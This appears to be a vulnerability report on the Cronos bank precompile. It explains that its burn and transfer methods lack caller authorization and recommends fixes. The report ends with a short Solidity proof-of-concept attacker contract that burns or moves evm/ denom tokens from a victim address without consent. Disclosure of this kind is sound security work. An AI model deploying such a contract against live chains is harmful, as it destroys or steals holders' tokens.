### Title
Unauthorized Burn/Transfer of `evm/` Denom Tokens via Bank Precompile ŌĆö Missing Caller Authorization Check - (File: x/cronos/keeper/precompiles/bank.go)

### Summary

The bank precompile's `burn` and `transfer` methods allow any EVM contract to burn or transfer `evm/{callerContract}` native bank-module tokens from **any arbitrary address** without that address's consent. There is no check that the target address has authorized the operation. This is a direct analog to the Lido bug: just as the Burner could burn stETH shares from WstETH's address (draining its collateral and blocking `unwrap`), any Cronos contract can drain `evm/{contract}` tokens from any user or contract address that holds them.

### Finding Description

The bank precompile at `x/cronos/keeper/precompiles/bank.go` exposes `mint`, `burn`, `balanceOf`, and `transfer` methods. The denom operated on is always `evm/{contract.Caller()}` ŌĆö the calling contract's own denom. For `burn`:

```go
// bank.go:121-149
recipient := args[0].(common.Address)          // address to burn FROM
amount    := args[1].(*big.Int)
addr      := sdk.AccAddress(recipient.Bytes())
if err := bc.checkBlockedAddr(addr); err != nil { // only blocks module accounts
    return nil, err
}
denom := EVMDenom(contract.Caller())            // evm/<callerContract>
amt   := sdk.NewCoin(denom, ...)
// ... burns evm/<caller> tokens from addr with NO authorization check
bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, ...)
bc.bankKeeper.BurnCoins(ctx, types.ModuleName, ...)
```

The only guard is `checkBlockedAddr`, which rejects module accounts. There is **no check** that `addr` (the burn target) has approved the calling contract to spend its tokens. The same flaw exists in `transfer`: the `sender` argument is used directly as the source of funds with no authorization from that address. [1](#0-0) 

The interface definition confirms the signature ŌĆö `burn(address, uint256)` ŌĆö where the first argument is the address to burn from, not the caller: [2](#0-1) 

The `checkBlockedAddr` function only rejects addresses that are registered as blocked (module accounts). Regular user addresses and contract addresses holding `evm/` tokens are not protected: [3](#0-2) 

### Impact Explanation

**Critical ŌĆö Unauthorized burn/transfer of precompile-controlled assets.**

Any EVM contract can:
1. Call `bank.burn(victimAddress, amount)` to destroy `evm/{contract}` tokens held by `victimAddress` without consent.
2. Call `bank.transfer(victimAddress, attackerAddress, amount)` to steal `evm/{contract}` tokens from `victimAddress` without consent.

The `evm/` denom tokens are real native bank-module assets. Protocols built on the bank precompile (such as `TestBank.sol` which uses `bank.mint`/`bank.burn` to back an ERC20 with native tokens) issue `evm/{contract}` tokens to users as real value-bearing receipts. A malicious or compromised contract can unilaterally drain those receipts from any holder.

The Lido analog is exact: WstETH holds stETH shares as collateral; burning those shares from WstETH's address blocks `unwrap`. Here, a contract that holds `evm/{contract}` tokens as collateral (e.g., a wrapped-token contract) can have those tokens burned by the issuing contract without consent, permanently blocking redemption for all holders. [4](#0-3) 

### Likelihood Explanation

**High.** Any unprivileged user can deploy a contract and call the bank precompile. No special role, key, or governance action is required. The bank precompile is registered and active in the EVM: [5](#0-4) 

The attack requires only: (1) a contract that calls `bank.burn(targetAddress, amount)`, and (2) the target holding `evm/{contract}` tokens. Both conditions are trivially achievable.

### Recommendation

Add an authorization check in the `burn` and `transfer` handlers to ensure the calling contract is only permitted to operate on tokens belonging to the **immediate EVM caller** (i.e., the address that invoked the contract in the current call frame), or require an explicit allowance mechanism analogous to ERC20 `approve`/`transferFrom`. Concretely:

- For `burn`: enforce `recipient == evm.Origin` or `recipient == contract.CallerAddress` (the EVM `msg.sender` of the call into the bank precompile), or require a pre-approved allowance.
- For `transfer`: enforce `sender == contract.CallerAddress` or require a pre-approved allowance.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IBankModule {
    function mint(address, uint256) external payable returns (bool);
    function burn(address, uint256) external payable returns (bool);
    function transfer(address, address, uint256) external payable returns (bool);
}

contract AttackerContract {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: Mint evm/<this> tokens to victim (e.g., as part of a "legitimate" service)
    function mintToVictim(address victim, uint256 amount) external {
        bank.mint(victim, amount);
    }

    // Step 2: Burn evm/<this> tokens from victim WITHOUT victim's consent
    function burnFromVictim(address victim, uint256 amount) external {
        // No authorization check in bank precompile ŌĆö succeeds unconditionally
        bank.burn(victim, amount);
    }

    // Step 3: Or steal evm/<this> tokens from victim to attacker
    function stealFromVictim(address victim, address attacker, uint256 amount) external {
        bank.transfer(victim, attacker, amount);
    }
}
```

**Execution:**
1. Deploy `AttackerContract` at address `0xATTACKER`.
2. Call `mintToVictim(victimAddr, 1000)` ŌĆö victim now holds 1000 `evm/0xATTACKER` tokens.
3. Call `burnFromVictim(victimAddr, 1000)` ŌĆö victim's tokens are destroyed with no consent from victim. The bank precompile executes `SendCoinsFromAccountToModule(victimAddr, ...)` + `BurnCoins(...)` with no authorization gate.

The `checkBlockedAddr` check passes because `victimAddr` is a regular user address, not a module account. The burn succeeds, permanently destroying the victim's `evm/0xATTACKER` balance. [6](#0-5)
